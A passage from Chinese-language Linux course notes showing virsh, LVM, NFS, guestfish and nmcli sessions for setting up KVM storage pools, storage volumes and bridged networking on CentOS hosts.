Disklabel type: dos
Disk identifier: 0x6c2c6adb

Device     Boot     Start       End   Sectors  Size Id Type
/dev/sda1  *         2048   2099199   2097152    1G 83 Linux
/dev/sda2         2099200 211814399 209715200  100G 83 Linux
/dev/sda3       211814400 316671999 104857600   50G 83 Linux
/dev/sda4       316672000 419430399 102758400   49G  5 Extended
/dev/sda5       316676096 325064703   8388608    4G 82 Linux swap / Solaris
/dev/sda6       316674048 316676095      2048    1M 83 Linux
/dev/sda7       325066752 346038271  20971520   10G 8e Linux LVM

Partition table entries are not in disk order.

Command (m for help): w
The partition table has been altered.
Syncing disks.


#创建分区后先变成物理卷
[root@centos8 ~]# pvcreate /dev/sda7
 Physical volume "/dev/sda7" successfully created
  
  
#把物理卷加入到卷组中
[root@centos8 ~]# vgcreate vg0 /dev/sda7 
Volume group "vg0" successfully created


[root@centos8 ~]# pvs
  PV         VG  Fmt  Attr PSize   PFree  
  /dev/sda7  vg0 lvm2 a--  <10.00g <10.00g

 
[root@centos8 ~]# vgs
  VG  #PV #LV #SN Attr   VSize   VFree  
  vg0   1   0   0 wz--n- <10.00g <10.00g

  
[root@centos8 ~]# virsh pool-define-as vm_images_lvm logical --source-name=vg0
Pool vm_images_lvm defined


[root@centos8 ~]#virsh pool-start vm_images_lvm 
Pool vm_images_lvm started

[root@centos8 ~]# virsh pool-autostart vm_images_lvm
Pool vm_images_lvm marked as autostarted


[root@centos8 ~]# virsh pool-list
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            active     yes       
 vm_images_disk       active     yes       
 vm_images_fs         active     yes       
 vm_images_lvm        active     yes   
```

![1658830586352](linux体系.assets/1658830586352.png)

**virt-manager利用已有的卷组创建存储池**

![1658830750572](linux体系.assets/1658830750572.png)

![1658830788360](linux体系.assets/1658830788360.png)

**删除存储池**

![1658830886305](linux体系.assets/1658830886305.png)

![1658830919936](linux体系.assets/1658830919936.png)

##### 46.7.6.7 基于NFS的存储池

![1658831031307](linux体系.assets/1658831031307.png)

**创建NFS共享**

```
#先在另一台主机10.0.0.18创建NFS服务及共享NFS目录
root@centos8_1:~# yum -y install nfs-utils
root@centos8_1:~# mkdir /data/kvmdata
root@centos8_1:~# echo '/data/kvmdata *(rw,no_root_squash)' > /etc/exports
root@centos8_1:~# systemctl enable --now nfs-server
root@centos8_1:~# exportfs -v
/data/kvmdata 	<world>(sync,wdelay,hide,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
```

**创建基于NFS服务的存储池**

```
#在宿主机创建存储池
[root@centos8 ~]# yum -y install nfs-utils
[root@centos8 ~]# mkdir /data/vm_images_nfs
[root@centos8 ~]# virsh pool-define-as vm_images_nfs netfs --source-host 10.0.0.18 --source-path /data/kvmdata --target /data/vm_images_nfs


#手动创建挂载点
[root@centos8 ~]# virsh pool-start vm_images_nfs
Pool vm_images_nfs started


#pool-build自动生成挂载点
[root@centos8 ~]#virsh pool-build vm_images_nfs 
Pool vm_images_nfs built


#查看挂载情况
[root@centos8 ~]# df
Filesystem              1K-blocks     Used Available Use% Mounted on
devtmpfs                  3957476        0   3957476   0% /dev
tmpfs                     3985408        0   3985408   0% /dev/shm
tmpfs                     3985408    17948   3967460   1% /run
tmpfs                     3985408        0   3985408   0% /sys/fs/cgroup
/dev/sda2               104806400 53990712  50815688  52% /
/dev/sda3                52403200 11971964  40431236  23% /data
/dev/loop0                1677618  1677618         0 100% /var/www/html/centos/8/os/x86_64
/dev/sda1                 1038336   230160    808176  23% /boot
/dev/sda6                    1003       21       911   3% /data/vm_images
tmpfs                      797080       12    797068   1% /run/user/0
10.0.0.18:/data/kvmdata  52403200   398336  52004864   1% /data/vm_images_nfs  #挂载成功



#开机自动启动
[root@centos8 ~]# virsh pool-autostart vm_images_nfs
Pool vm_images_nfs marked as autostarted




#查看存储池
[root@centos8 ~]# virsh pool-list
 Name                 State      Autostart 
-------------------------------------------
 default              active     yes       
 isos                 active     yes       
 vm_images            active     yes       
 vm_images_disk       active     yes       
 vm_images_fs         active     yes       
 vm_images_lvm        active     yes       
 vm_images_nfs        active     yes
```

![1658832387916](linux体系.assets/1658832387916.png)

**删除存储池**

```
[root@centos8 ~]#virsh pool-destroy vm_images_nfs 
Pool vm_images_nfs destroyed


[root@centos8 ~]#df 
Filesystem     1K-blocks     Used Available Use% Mounted on
devtmpfs         4050832        0   4050832   0% /dev
tmpfs            4067612        0   4067612   0% /dev/shm
tmpfs            4067612     9388   4058224   1% /run
tmpfs            4067612        0   4067612   0% /sys/fs/cgroup
/dev/sda2      104806400 36339252  68467148  35% /
/dev/sda3       52403200 12331584  40071616  24% /data
/dev/sda1         999320   120528    809980  13% /boot


[root@centos8 ~]#virsh pool-undefine vm_images_nfs 
Pool vm_images_nfs has been undefined


[root@centos8 ~]#ls /data/
isos/         vm_images_nfs/ 


[root@centos8 ~]#virsh pool-list --all
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active     yes
```

#### 46.7.7 存储卷管理

##### 46.7.7.1存储卷概述

```
一个存储池被分割为多个存储卷（Storage Volume)

存储卷可以为以下多种形式
  文件
  块设备（如物理分区、LVM逻辑卷等）
  libvirt管理的其他类型存储的抽象
```

**存储卷管理相关命令**

```
vol-clone 		   #克隆卷
vol-create-as      #通过一组参数创建卷
vol-create         #通过XML文件创建卷
vol-create-from    #通过输入的其他卷创建—个新的卷
vol-delete 		   #删除一个卷
vol-download 	   #下载卷的内容到一个文件
vol-dumpxml 	   #保存卷信息的信息到xML文件中
vol-info           #存储卷的信息
vol-key			  #根据卷名或路径返回卷的key
vol-list 		  #列出卷
vol-name		  #根据卷的key或路径返回卷名
vol-path 		  #根据卷名或key返回卷的路径
vol-pool 		  #根据卷的key或路径返回存储池
vol-resize		  #调整卷大小
vol-upload 		  #上传文件内容到一个卷
vol-wipe 		  #wipe ─个卷
```

##### 46.7.7.2 基于目录的存储池的存储卷管理

**创建基于目录的存储池**

```
[root@centos8 ~]# mkdir /data/vm_images_dir
[root@centos8 ~]# virsh pool-define-as vm_images_dir dir --target /data/vm_images_dir
Pool vm_images_dir defined

[root@centos8 ~]# virsh pool-start vm_images_dir
Pool vm_images_dir started

[root@centos8 ~]# virsh pool-autostart vm_images_dir
Pool vm_images_dir marked as autostarted

[root@centos8 ~]# virsh pool-list
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                 active    yes       
 vm_images_dir       active     no
```

**创建基于目录的存储池的存储卷**

```
[root@centos8 ~]# virsh vol-create-as vm_images_dir test1.qcow2 1g --format qcow2
Vol test1.qcow2 created


[root@centos8 ~]#ls /data/vm_images_dir/ -lh
total 196K
-rw------- 1 root root 193K Sep 20 21:47 test1.qcow2


[root@centos8 ~]# virsh vol-info test1.qcow2 --pool vm_images_dir
Name:           test1.qcow2
Type:           file
Capacity:       1.00 GiB
Allocation:     196.00 KiB
```

![1658837229971](linux体系.assets/1658837229971.png)

**删除基于目录的存储池的存储卷**

```
[root@centos8 ~]#virsh vol-delete  test1.qcow2 vm_images_dir

Vol test1.qcow2 deleted
[root@centos8 ~]#ls /data/
isos/         vm_images_dir/ vm_images_nfs/ 
[root@centos8 ~]#ls /data/vm_images_dir/
```

##### 46.7.7.3 基于LVM的存储池的存储卷管理

**创建基于LVM的存储池**

```
[root@centos8 ~]#pvs


#添加新硬盘
[root@centos8 ~]#lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0 200G  0 disk 
├─sda1   8:1    0   1G  0 part /boot
├─sda2   8:2    0 100G  0 part /
├─sda3   8:3    0   50G  0 part /data
├─sda4   8:4    0   1K  0 part 
├─sda5   8:5    0   2G  0 part [SWAP]
└─sda6   8:6    0   10G  0 part 
sdb      8:16   0   20G  0 disk 
sr0     11:0    1  7.7G  0 rom  


#指定新硬盘直接创建基于LVM的存储池
[root@centos8 ~]#virsh pool-define-as vm_images_lvm logical --source-dev=/dev/sdb 
Pool vm_images_lvm defined

[root@centos8 ~]# virsh pool-build vm_images_lvm
Pool vm_images_lvm built


[root@centos8 ~]#pvs
 PV         VG           Fmt Attr PSize   PFree  
 /dev/sdb   vm_images_lvm lvm2 a-- <20.00g <20.00g
 
 
[root@centos8 ~]#vgs
 VG            #PV #LV #SN Attr   VSize   VFree  
 vm_images_lvm   1   0   0 wz--n- <20.00g <20.00g
 
 
[root@centos8 ~]#virsh pool-start vm_images_lvm
Pool vm_images_lvm started


[root@centos8 ~]#virsh pool-list
 Name                 State     Autostart 
-------------------------------------------
 default             active     yes       
 isos                active     yes       
 vm_images_dir       active     no        
 vm_images_lvm       active     no   
 
 
#没有逻辑卷
[root@centos8 ~]#lvs
```

**创建基于LVM的存储池的存储卷**

```
[root@centos8 ~]#virsh vol-create-as vm_images_lvm lv0 5g
Vol lv0 created


#自动创建逻辑卷
[root@centos8 ~]#lvs
 LV     VG           Attr       LSize Pool Origin Data% Meta% Move Log 
Cpy%Sync Convert
 lvvol1 vm_images_lvm -wi-a----- 5.00g                                         
           
[root@centos8 ~]#virsh vol-list vm_images_lvm 
 Name                 Path                                    
------------------------------------------------------------------------------
 lv0               /dev/vm_images_lvm/lv0
```

![1658838681240](linux体系.assets/1658838681240.png)

**利用存储卷创建虚拟机**

![1658838808837](linux体系.assets/1658838808837.png)



![1658838839982](linux体系.assets/1658838839982.png)

![1658838860255](linux体系.assets/1658838860255.png)

![1658838884362](linux体系.assets/1658838884362.png)

![1658838957559](linux体系.assets/1658838957559.png)

![1658838978790](linux体系.assets/1658838978790.png)

##### 46.7.7.4 克隆存储卷

**克隆基于文件的存储卷**

```
[root@centos8 ~]#virsh vol-list default 
 Name                 Path                                    
------------------------------------------------------------------------------
 centos7-vm1.qcow2   /var/lib/libvirt/images/centos7-vm1.qcow2
 centos7-vm2.qcow2   /var/lib/libvirt/images/centos7-vm2.qcow2
 centos7.qcow2       /var/lib/libvirt/images/centos7.qcow2   
 centos8-test1.qcow2 /var/lib/libvirt/images/centos8-test1.qcow2
 centos8.qcow2       /var/lib/libvirt/images/centos8.qcow2   
 Windows-2008_r2-x86_64.qcow2 /var/lib/libvirt/images/Windows-2008_r2-x86_64.qcow2
 
 
[root@centos8 ~]#virsh vol-info centos7.qcow2 default
Name:           centos7.qcow2
Type:           file
Capacity:       20.00 GiB
Allocation:     1.56 GiB


[root@centos8 ~]#virsh vol-clone centos7.qcow2 centos7_clone.qcow2 default
Vol centos7_clone.qcow2 cloned from centos7.qcow2
[root@centos8 ~]#virsh vol-info centos7_clone.qcow2 default
Name:           centos7_clone.qcow2
Type:           file
Capacity:       20.00 GiB
Allocation:     1.52 GiB


[root@centos8 ~]#virsh vol-list default 
 Name                 Path                                    
------------------------------------------------------------------------------
 centos7-vm1.qcow2   /var/lib/libvirt/images/centos7-vm1.qcow2
 centos7-vm2.qcow2   /var/lib/libvirt/images/centos7-vm2.qcow2
 centos7.qcow2       /var/lib/libvirt/images/centos7.qcow2   
 centos7_clone.qcow2 /var/lib/libvirt/images/centos7_clone.qcow2
 centos8-test1.qcow2 /var/lib/libvirt/images/centos8-test1.qcow2
 centos8.qcow2       /var/lib/libvirt/images/centos8.qcow2   
 Windows-2008_r2-x86_64.qcow2 /var/lib/libvirt/images/Windows-2008_r2-x86_64.qcow2
 
 
[root@centos8 ~]#ll -h /var/lib/libvirt/images/centos7.qcow2 /var/lib/libvirt/images/centos7_clone.qcow2 
-rw-r--r-- 1 root root 1.6G Sep 20 22:22 
/var/lib/libvirt/images/centos7_clone.qcow2
-rw-r--r-- 1 root root 1.6G Sep 20 18:09 /var/lib/libvirt/images/centos7.qcow2
```

**克隆基于LVM的存储卷**

```
[root@centos8 ~]#virsh vol-list vm_images_lvm 
 Name                 Path                                    
------------------------------------------------------------------------------
 lv0_clone               /dev/vm_images_lvm/lv0_clone           
 
[root@centos8 ~]#virsh vol-clone  lv0 lv0_clone vm_images_lvm
Vol lv0_clone cloned from lv0

[root@centos8 ~]#virsh vol-list vm_images_lvm 
 Name                 Path                                    
------------------------------------------------------------------------------
 lv0               /dev/vm_images_lvm/lv0               
 lv0_clone         /dev/vm_images_lvm/lv0_clone  
 
 [root@centos8 ~]#lvs
 LV           VG           Attr       LSize Pool Origin Data% Meta% Move Log 
Cpy%Sync Convert
 lv0       vm_images_lvm -wi-a----- 1.00g                                   
                 
 lv0_clone vm_images_lvm -wi-a----- 1.00g
```

![1658839923728](linux体系.assets/1658840123448.png)



##### 46.7.7.5 向虚拟机添加存储卷

可以通过attach-device和attach-disk给现有虚拟机添加存储卷,从而实现给虚拟机新添加虚拟磁盘

 **attach-device 通过XML文件给已有虚拟机添加存储卷**

```
[root@centos8 ~]#virsh vol-list vm_images_dir
 Name                 Path                                    
------------------------------------------------------------------------------
 test1.qcow2         /data/vm_images_dir/test1.qcow2
 
[root@centos8 ~]#cat disk.xml 
<disk type='file' device='disk'>
<driver name='qemu' type='qcow2' cache='none'/>
<source file='/data/vm_images_dir/test1.qcow2'/>
<target dev='vdb'/>
</disk>

[root@centos8 ~]#virsh start centos7 
Domain centos7 started


#默认只是临时添加设备,使用选项--persistent实现持久保存
[root@centos8 ~]#virsh attach-device centos7 disk.xml --persistent 
Device attached successfully


#查看虚拟机当前的块设备信息
[root@centos8 ~]#virsh domblklist centos7
Target     Source
------------------------------------------------
vdb       /data/vm_images_dir/test1.qcow2
vdc       /var/lib/libvirt/images/centos7.qcow2
hdb        -
```

![1658840537074](linux体系.assets/1658840537074.png)

![1658840572220](linux体系.assets/1658840572220.png)

**attach-disk给已有虚拟机添加存储卷**

```
[root@centos8 ~]#virsh start centos7
Domain centos7 started

[root@centos8 ~]#virsh attach-disk --domain centos7 --sourcetype block --source /dev/vm_images_lvm/lv0 --target vdc
Disk attached successfully
```

![1658840875390](linux体系.assets/1658840875390.png)

#### 46.7.8 离线工具

```
#1.概述
不启动虚拟机的情况下,直接访问管理虚拟机对应的磁盘,即离线访问


#2.离线工具应用
观看或下载位于虚拟机磁盘中的文件
编辑或上传文件到虚拟机磁盘
读取或写入的虚拟机配置
准备新的磁盘映像，其中包含文件、目录、文件系统、分区、逻辑卷和其他选项
拯救和修复客户无法启动或需要更改启动配置的虚拟机
监控虚拟机的磁盘使用情况
根据组织安全标准审计虚拟机的合规性
通过克隆和修改模板来部署虚拟机
读取CD和DVD ISO和软盘映像
```

##### 46.7.8.1 guestfs工具

```
#1.概述
Libguestfs 提供了一个简单地访问虚机磁盘镜像文件的方法，即使是在虚拟机无法启动的情况下
Libguestfs 是由一组丰富的工具集组成，可以让管理员访问虚机文件，甚至调整和挽救文件。
guestfish 是一个基于libguestfs API的交互shell。



#2.安装和使用guestfs
[root@centos8 ~]# dnf -y install libguestfs-tools


#查看虚拟机的磁盘文件
[root@centos8 ~]#virsh domblklist centos7
Target     Source
------------------------------------------------
vdc       /var/lib/libvirt/images/centos7.qcow2
hdb        - 


#只读方式打开虚拟磁盘
[root@centos8 ~]#guestfish --ro -a /var/lib/libvirt/images/centos7.qcow2
Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.
Type: ‘help’ for help on commands
     ‘man’ to read the manual
     ‘quit’ to quit the shell
><fs> help
Add disk images to examine using the ‘-a’ or ‘-d’ options, or the ‘add’
command.
Or create a new disk image using ‘-N’, or the ‘alloc’ or ‘sparse’ commands.
Once you have done this, use the ‘run’ command.
For more information about a command, use ‘help cmd’.
To read the manual, type ‘man’.
><fs> run               #扫描磁盘
◓ 75% ⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 100% 
⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒⟧ 00:00
><fs> list-filesystems   #列出文件系统
/dev/sda1: xfs
/dev/centos/root: xfs
/dev/centos/swap: swap
><fs> 


><fs> mount /dev/sda1 /     #挂载
><fs> ls / #查看
.vmlinuz-3.10.0-1127.el7.x86_64.hmac
System.map-3.10.0-1127.el7.x86_64
config-3.10.0-1127.el7.x86_64
efi
grub
grub2
initramfs-0-rescue-1d660cbcc84f4a399d9f991578c3c6f8.img
initramfs-3.10.0-1127.el7.x86_64.img
initramfs-3.10.0-1127.el7.x86_64kdump.img
symvers-3.10.0-1127.el7.x86_64.gz
vmlinuz-0-rescue-1d660cbcc84f4a399d9f991578c3c6f8
vmlinuz-3.10.0-1127.el7.x86_64
```

**guestfs自动挂载文件系统**

```
#虚拟机开机无法访问虚拟磁盘
#选项-d指定虚拟机domain打开虚拟磁盘
[root@centos8 ~]#guestfish -d centos7 
libguestfs: error: error: domain is a live virtual machine.
Writing to the disks of a running virtual machine can cause disk corruption.Either use read-only access, or if the guest is running the guestfsd daemonspecify live access. In most libguestfs tools these options are --ro or--live respectively. Consult the documentation for further information.


[root@centos8 ~]#virsh destroy centos7
Domain centos7 destroyed


#选项-i 可以实现自动探查后进行自动挂载
[root@centos8 ~]#guestfish --ro -a /var/lib/libvirt/images/centos7.qcow2 -i 

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
     ‘man’ to read the manual
     ‘quit’ to quit the shell
     
Operating system: CentOS Linux release 7.8.2003 (Core)
/dev/centos/root mounted on /
/dev/sda1 mounted on /boot

><fs> ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

**guestfs离线修改虚拟磁盘内的文件**

```
[root@centos8 ~]# guestfish -d centos8 -i

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

Operating system: CentOS Linux release 8.2.2004 (Core) 
/dev/cl_centos8/root mounted on /
/dev/sda1 mounted on /boot

><fs> edit /etc/issue
><fs> edit /etc/issue

welcome to liusenbiao‘s VM
\S
Kernel \r on an \m
><fs> exit

[root@centos8 ~]# virsh start centos8
Domain centos8 started
```

![1658842603976](linux体系.assets/1658842603976.png)

##### 46.7.8.2 其它离线工具

```
virt-df #监视磁盘使用
virt-resize #离线调整虚拟磁盘大小
virt-inspector #虚拟机检视
virt-win-reg #Windows注册表读取和修改
virt-sysprep #虚拟机设置重置
```

### 46.8 网络管理

#### 46.8.1 Linux网桥实现

![1658927631686](linux体系.assets/1658927631686.png)

```
#创建网桥
nmcli con add type bridge con-name br0 ifname br0
nmcli connection modify br0 ipv4.addresses 10.0.0.100/24 ipv4.method manual
nmcli con up br0


#加入物理网卡
nmcli con add type bridge-slave con-name br0-port0 ifname eth0 master br0
nmcli con add type bridge-slave con-name br0-port1 ifname eth1 master br0
nmcli con up br0-port0
nmcli con up br0-port1


#查看网桥配置文件
cat /etc/sysconfig/network-scripts/ifcfg-virbr1
DEVICE=virbr1
STP=yes
TYPE=Bridge
BOOTPROTO=static
IPADDR=10.0.0.100
PREFIX=24


cat /etc/sysconfig/network-scripts/ifcfg-eth0
TYPE=Ethernet
NAME=br0-port0
DEVICE=eth0
ONBOOT=yes
BRIDGE=br0
UUID=23f41d3b-b57c-4e26-9b17-d5f02dafd12d


#安装管理软件包,注意:CentOS8取消了此包
yum install bridge-utils


#查看网桥
brctl show
ip link show master br0
bridge link show


#删除br0
nmcli con down br0
rm /etc/sysconfig/network-scripts/ifcfg-br0*
nmcli con reload
```

#### 46.8.2 qemu-kvm支持的网络

```
#1.虚拟机的网络模式:
基于NAT ( Network Addresss Translation)的虚拟网络,此为virt-install的默认模式
基于自定义网桥（Bridge ）的虚拟网络
用户自定义的隔离的虚拟网络
直接分配物理网络设备（包括VT-d和SR-IOV),性能最好


虚拟机的网卡设备:
RTL8139、e1000、....
virtio 生产建议使用



#2.范例: 查看qemu-kvm支持的网卡型号
[root@centos8 ~]# /usr/libexec/qemu-kvm -net nic,model=?
qemu: Supported NIC models: e1000,e1000-82540em,e1000e,rtl8139,virtio-net-pci
```

#### 46.8.3 默认的网络配置NAT模式

##### 46.8.3.1 默认网络连接的架构图

默认虚拟机网络配置为NAT模式,相当于vmware的NAT模式的Vmnet8

![1658920842061](linux体系.assets/1658920842061.png)

##### 46.8.3.2 宿主机默认网络相关服务和信息

```
#默认宿主机安装dnsmasq包指供DHCP服
[root@centos8 ~]# cat /var/lib/libvirt/dnsmasq/default.conf
##WARNING:  THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
##OVERWRITTEN AND LOST.  Changes to this configuration should be made using:
##    virsh net-edit default
## or other application using the libvirt API.
##
## dnsmasq conf file created by libvirt
strict-order
pid-file=/var/run/libvirt/network/default.pid
except-interface=lo
bind-dynamic
interface=virbr0
dhcp-range=192.168.122.2,192.168.122.254
dhcp-no-override
dhcp-authoritative
dhcp-lease-max=253
dhcp-hostsfile=/var/lib/libvirt/dnsmasq/default.hostsfile
addn-hosts=/var/lib/libvirt/dnsmasq/default.addnhosts
```

**范例: 查看宿主机的网桥信息**

```
#查看谁加入到网桥virbr0中
[root@centos8 ~]# ip link show master virbr0
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr0 state DOWN mode DEFAULT group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
5: vnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel master virbr0 state UNKNOWN mode DEFAULT group default qlen 1000
    link/ether fe:54:00:90:c0:96 brd ff:ff:ff:ff:ff:ff



#查看所有桥接网卡信息及对应网桥
[root@centos8 ~]# bridge link show
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 master virbr0 state disabled priority 32 cost 100 
5: vnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 master virbr0 state forwarding priority 32 cost 100 


#centos7查看网桥信息
[19:32:55 root@centos7 ~]#brctl show
#一个网桥virbr0有两个网卡virbr0-nic和vnet0
bridge name  	bridge id		    STP enabled	   interfaces
virbr0		    8000.52540097163e	yes		       virbr0-nic
							                      vnet0

##查看虚拟机的网卡地址信息
[root@centos8 ~]# virsh domifaddr centos8
 Name       MAC address          Protocol     Address
-------------------------------------------------------------------------------
 vnet0      52:54:00:90:c0:96    ipv4         192.168.122.205/24
 
 
 
[root@centos8 ~]# nmtui
```

![1658921889110](linux体系.assets/1658921889110.png)

![1658922063312](linux体系.assets/1658922063312.png)

![1658921997612](linux体系.assets/1658921997612.png)

#### 46.8.4 配置虚拟机与宿主机的相连

![1658926715463](linux体系.assets/1658926715463.png)

```
#未修改桥接模式前
[root@centos8 ~]# virsh domifaddr centos8
 Name       MAC address          Protocol     Address
-------------------------------------------------------------------------------
 vnet0      52:54:00:90:c0:96    ipv4         192.168.122.205/24



#修改桥接模式后
[root@centos8 ~]# virsh domiflist centos8
Interface  Type       Source     Model       MAC
-------------------------------------------------------
macvtap0   direct     eth0       virtio      52:54:00:90:c0:96


[root@centos8 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.8/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe5e:6b05/64 scope link 
       valid_lft forever preferred_lft forever
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
6: macvtap0@eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 500
    link/ether 52:54:00:90:c0:96 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::5054:ff:fe90:c096/64 scope link 
       valid_lft forever preferred_lft forever  #多了个这个
```

**关机重启生效**

![1658925303587](linux体系.assets/1658925303587.png)

![1658925949022](linux体系.assets/1658925949022.png)

![1658926142675](linux体系.assets/1658926142675.png)

**ping 10.0.0.7实现跨网络通讯**

![1658926239201](linux体系.assets/1658926239201.png)

**外部网络访问**

![1658926535817](linux体系.assets/1658926535817.png)

![1658926587139](linux体系.assets/1658926587139.png)

#### 46.8.5 基于自定义网桥的虚拟网络

##### 46.8.5.1 自定义网桥架构

```
桥接网络可以让运行在宿主机上的虚拟机使用和宿主机相同网段的IP，并且可以从外部直接访问到虚拟机，目前企业中大部分场景都使用桥接网络。
```

![1658926997685](linux体系.assets/1658926997685.png)

**自定义网桥**

![1658927631686](linux体系.assets/1658927631686.png)

**10.0.0.8**

```
[root@centos8 ~]# vim /etc/sysconfig/network-scripts/ifcfg-virbr1
DEVICE=virbr1
NAME=virbr1
STP=yes
TYPE=Bridge
BOOTPROTO=static
IPADDR=10.0.0.8
PREFIX=24


[root@centos8 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=virbr1-port0
BRIDGE=virbr1
ONBOOT=yes


[root@centos8 network-scripts]# nmcli connection reload 
[root@centos8 network-scripts]# nmcli connection
NAME          UUID                                  TYPE      DEVICE 
virbr1-port0  5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0   
virbr1        282db82c-a36d-fb08-d7a9-78ef62fac87e  bridge    virbr1 
virbr0        7d78e422-2f13-45e4-9d72-516ee6fc9208  bridge    virbr0 


[root@centos8 network-scripts]# nmcli connection up virbr1
Connection successfully activated (master waiting for slaves) (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/6)
[root@centos8 network-scripts]# nmcli connection up virbr1-port0



[root@centos8 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel master virbr1 state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
7: virbr1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.8/24 brd 10.0.0.255 scope global noprefixroute virbr1
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe5e:6b05/64 scope link 
       valid_lft forever preferred_lft forever  #成功！！
```

**10.0.0.7**

```
#添加网桥
[21:09:32 root@centos7 ~]#nmcli connection add  con-name virbr1 type bridge ifname virbr1 ipv4.method manual ipv4.addresses 10.0.0.7/24 ipv4.gateway 10.0.0.2

Connection 'virbr1' (e69f81ad-4b90-4bf7-918c-a145b0d2fed5) successfully added.



#添加接口
[22:06:25 root@centos7 ~]# nmcli connection add con-name virbr1-port0 ifname eth0 type bridge-slave master virbr1 

Connection 'virb1-port0' (c380ab90-36e2-4edc-a2cb-5c611198f729) successfully added.



#启动接口
[22:08:56 root@centos7 ~]#nmcli connection reload 
[22:11:03 root@centos7 ~]#nmcli connection up virbr1
Connection successfully activated (master waiting for slaves) (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/7)
[22:12:00 root@centos7 ~]#nmcli connection up virbr1-port0




#查看状态
[22:13:57 root@centos7 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr1 state UP group default qlen 1000
    link/ether 00:0c:29:e7:e8:52 brd ff:ff:ff:ff:ff:ff
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
